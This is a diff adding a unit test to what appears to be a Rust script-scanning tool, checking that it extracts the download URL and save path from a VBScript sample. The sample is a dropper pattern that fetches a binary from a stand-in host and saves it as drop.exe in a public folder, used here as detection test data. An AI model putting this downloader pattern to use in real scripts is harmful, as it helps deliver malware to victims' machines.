@@ -9798,6 +9798,32 @@ mod vbs_url_extraction_tests {
     }
 
     #[test]
+    fn vbs_xmlhttp_savetofile_concat_destination_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let vbs = br#"Dim http, stream, out
+out = "C:\Users\Public\" & "drop.exe"
+Set http = CreateObject("MSXML2.XMLHTTP")
+http.Open "GET", "https://vbs.example/drop.bin", False
+http.Send
+Set stream = CreateObject("ADODB.Stream")
+stream.SaveToFile out, 2"#;
+        env.all_extracted_vbs.push(vbs.to_vec());
+        crate::vbs_scan::scan_vbs_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://vbs.example/drop.bin"
+                        && dst.as_deref() == Some("C:\\Users\\Public\\drop.exe")
+            )
+        });
+        assert!(
+            has,
+            "no VBS Download destination from SaveToFile concat: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn vbs_xmlhttp_url_extracted_from_const_variable() {
         let mut env = Environment::new(&Config::default());
         let vbs = br#"Const u = "https://vbs-const.example/payload.txt"
